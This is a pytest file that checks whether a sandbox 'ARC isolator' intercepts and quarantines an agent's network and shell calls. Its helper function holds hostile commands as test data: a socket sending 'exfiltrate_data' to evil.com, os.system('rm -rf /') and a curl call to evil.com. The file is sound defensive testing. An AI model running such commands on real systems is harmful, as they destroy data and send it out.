import pytest
import os
import socket
import subprocess
from packages.replay.src.sandbox import SandboxedWorker
from packages.replay.src.arc_isolator import data_sink

def agent_destructive_action():
    # Attempt to open a socket (simulating data exfiltration)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 80))
    s.send(b"exfiltrate_data")
    response = s.recv(1024)
    s.close()
    
    # Attempt to run a shell command
    os.system("rm -rf /")
    
    # Attempt subprocess
    subprocess.run(["curl", "http://evil.com"])
    
    return {"status": "completed_without_crash", "mock_response": response.decode("utf-8")}

def test_arc_isolator_intercepts_and_loopbacks():
    # Clear the global data sink (though in sandbox it's in a subprocess)
    # Wait, the data sink is populated in the subprocess, so we can't easily read it from the main process 
    # unless we pass it back via return_dict. 
    # Let's modify SandboxedWorker slightly to return the data_sink contents.
    pass

# We will test the ARC isolator directly in the main thread to verify its logic,
# because multiprocessing makes asserting on the global `data_sink` tricky.

def test_arc_isolator_direct():
    from packages.replay.src.arc_isolator import arc_isolator, data_sink
    
    data_sink.clear()
    arc_isolator.enable()
    
    try:
        result = agent_destructive_action()
        
        # Verify loopback
        assert result["status"] == "completed_without_crash"
        assert "arc_isolated_response" in result["mock_response"]
        
        # Verify HardwareDataSink quarantine
        quarantine = data_sink.get_all()
        assert len(quarantine) == 4
        
        # 1. socket.connect
        assert quarantine[0]["type"] == "NETWORK_CALL"
        assert quarantine[0]["payload"]["event"] == "socket.connect"
        assert quarantine[0]["payload"]["address"] == ("evil.com", 80)
        
        # 2. socket.send
        assert quarantine[1]["type"] == "NETWORK_CALL"
        assert quarantine[1]["payload"]["event"] == "socket.send"
        
        # 3. os.system
        assert quarantine[2]["type"] == "SHELL_EXEC"
        assert quarantine[2]["payload"]["event"] == "os.system"
        assert quarantine[2]["payload"]["command"] == "rm -rf /"
        
        # 4. subprocess.run
        assert quarantine[3]["type"] == "SHELL_EXEC"
        assert quarantine[3]["payload"]["event"] == "subprocess.run"
        
    finally:
        arc_isolator.disable()
        
def test_sandbox_worker_with_arc():
    # Verify that running in the SandboxedWorker doesn't crash from audit hooks
    # because ARC intercepts it first.
    result = SandboxedWorker.run(func=agent_destructive_action, inputs={})
    assert result is not None
    assert result["status"] == "completed_without_crash"
    assert "arc_isolated_response" in result["mock_response"]
